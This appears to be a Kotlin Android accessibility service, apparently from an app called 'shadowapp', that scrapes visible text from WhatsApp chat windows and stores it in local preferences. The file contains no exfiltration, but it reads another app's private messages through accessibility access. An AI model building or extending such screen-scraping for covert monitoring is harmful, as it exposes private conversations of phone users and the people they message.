package com.shadowapp

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class DeteccionGrupoService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val paquete = event.packageName?.toString() ?: return

        if (paquete != "com.whatsapp" &&
            paquete != "com.whatsapp.w4b"
        ) return

        if (event.eventType !=
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
            event.eventType !=
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
        ) return

        val raiz = rootInActiveWindow ?: return
        val textos = linkedSetOf<String>()

        try {
            recopilarTextos(raiz, textos, 0)

            val resultado = textos
                .filter { it.isNotBlank() }
                .take(40)
                .joinToString("\n")

            if (resultado.isNotBlank()) {
                getSharedPreferences(
                    "shadowapp_datos",
                    MODE_PRIVATE
                ).edit()
                    .putString("texto_detectado", resultado)
                    .apply()
            }
        } finally {
            raiz.recycle()
        }
    }

    private fun recopilarTextos(
        nodo: AccessibilityNodeInfo,
        textos: MutableSet<String>,
        profundidad: Int
    ) {
        if (profundidad > 20 || textos.size >= 40) return

        val visible = nodo.isVisibleToUser

        if (visible) {
            val texto = nodo.text?.toString()?.trim().orEmpty()
            val descripcion =
                nodo.contentDescription?.toString()?.trim().orEmpty()

            if (texto.isNotBlank() && texto.length <= 120) {
                textos.add(texto)
            }

            if (descripcion.isNotBlank() &&
                descripcion.length <= 120
            ) {
                textos.add(descripcion)
            }
        }

        for (i in 0 until nodo.childCount) {
            if (textos.size >= 40) break

            val hijo = nodo.getChild(i) ?: continue

            try {
                recopilarTextos(hijo, textos, profundidad + 1)
            } finally {
                hijo.recycle()
            }
        }
    }

    override fun onInterrupt() {
        // Android puede interrumpir el servicio en cualquier momento.
    }
}
